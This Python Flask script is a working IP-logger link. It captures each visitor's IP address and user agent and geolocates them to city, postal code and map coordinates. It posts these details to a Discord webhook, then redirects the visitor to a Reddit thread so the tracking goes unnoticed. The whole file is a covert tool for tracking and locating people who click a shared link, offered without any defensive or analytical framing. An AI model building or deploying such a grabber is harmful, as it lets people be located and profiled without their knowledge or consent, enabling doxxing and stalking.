import requests
from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

# Your Discord Webhook URL
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN")

logged_ips = set()

def get_real_ip():
    """Extract the real IP address from the request"""
    xff = request.headers.get("X-Forwarded-For", "").split(",")
    return xff[0].strip() if xff else request.remote_addr

def get_visitor_info(ip, user_agent):
    """Get geolocation information based on IP"""
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        
        if r.status_code == 200:
            details = r.json()
        else:
            details = {}
            print(f"API Error: Status Code {r.status_code}")
    except Exception as e:
        details = {}
        print(f"API Error: {e}")

    lat = details.get("latitude", 0)
    lon = details.get("longitude", 0)
    
    return {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "XX").lower(),
        "region": details.get("region", "Unknown"),
        "city": details.get("city", "Unknown"),
        "zip": details.get("postal", "Unknown"),
        "lat": lat,
        "lon": lon,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info):
    """Send the information to Discord webhook"""
    embed = {
        "username": "🌍 Visitor Bot",
        "embeds": [{
            "title": f"🚶‍♂️ New Visitor from {info['country']}",
            "description": "Here’s a breakdown of the visitor's details:",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP & Location", "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}", "inline": False},
                {"name": "📱 User Agent", "value": f"**Browser/Device:** `{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps Location", "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False}
            ],
            "footer": {
                "text": f"🔗 Visit logged at: {info['date']} {info['time']} (GMT)",
                "icon_url": "https://example.com/alarm-clock-icon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    response = requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
    print(f"Discord webhook response: {response.status_code}")

@app.route('/')
def index():
    """Main route that handles the incoming request"""
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    # Only log the IP and send to Discord if it's not already logged
    if ip not in logged_ips:
        logged_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)
    else:
        print(f"IP {ip} already logged. Skipping.")

    # Redirect the user instantly to the Reddit page
    return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
